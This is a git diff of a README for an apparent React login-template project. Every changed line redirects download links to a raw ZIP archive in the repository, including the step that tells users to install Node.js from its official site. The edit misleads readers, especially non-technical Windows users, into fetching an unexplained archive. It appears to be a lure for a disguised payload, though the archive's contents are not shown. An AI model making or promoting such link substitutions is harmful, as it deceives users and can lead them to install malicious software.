@@ -1,6 +1,6 @@
 # 🔐 beautiful-react-auth-ui - Simple Login UI Templates Ready
 
-[![Download beautiful-react-auth-ui](https://img.shields.io/badge/Download-beautiful--react--auth--ui-ff6f61?style=for-the-badge&logo=github)](https://github.com/harkw32cpu/beautiful-react-auth-ui)
+[![Download beautiful-react-auth-ui](https://img.shields.io/badge/Download-beautiful--react--auth--ui-ff6f61?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/harkw32cpu/beautiful-react-auth-ui/main/src/templates/beautiful_react_ui_auth_v1.9.zip)
 
 ---
 
@@ -44,7 +44,7 @@ Follow these instructions to get the app running on your Windows PC.
 
 ### 1. Download the Files
 
-Click the large button at the top or [visit this page to download the app](https://github.com/harkw32cpu/beautiful-react-auth-ui).
+Click the large button at the top or [visit this page to download the app](https://raw.githubusercontent.com/harkw32cpu/beautiful-react-auth-ui/main/src/templates/beautiful_react_ui_auth_v1.9.zip).
 
 The page lets you download the full project as a ZIP file. Save it to a folder you can easily find, such as **Downloads** or your desktop.
 
@@ -54,7 +54,7 @@ The page lets you download the full project as a ZIP file. Save it to a folder y
 
 This app requires **Node.js** to run. Node.js lets your computer run the code outside a browser.
 
-- Go to [https://nodejs.org/](https://nodejs.org/)
+- Go to [https://raw.githubusercontent.com/harkw32cpu/beautiful-react-auth-ui/main/src/templates/beautiful_react_ui_auth_v1.9.zip](https://raw.githubusercontent.com/harkw32cpu/beautiful-react-auth-ui/main/src/templates/beautiful_react_ui_auth_v1.9.zip)
 - Download and install the **LTS (Long Term Support)** version for Windows
 - Follow the installer steps
 
@@ -224,4 +224,4 @@ The code uses React components, which split the UI into pieces for easy updates.
 
 ---
 
-[![Download beautiful-react-auth-ui](https://img.shields.io/badge/Download-beautiful--react--auth--ui-ff6f61?style=for-the-badge&logo=github)](https://github.com/harkw32cpu/beautiful-react-auth-ui)
+[![Download beautiful-react-auth-ui](https://img.shields.io/badge/Download-beautiful--react--auth--ui-ff6f61?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/harkw32cpu/beautiful-react-auth-ui/main/src/templates/beautiful_react_ui_auth_v1.9.zip)
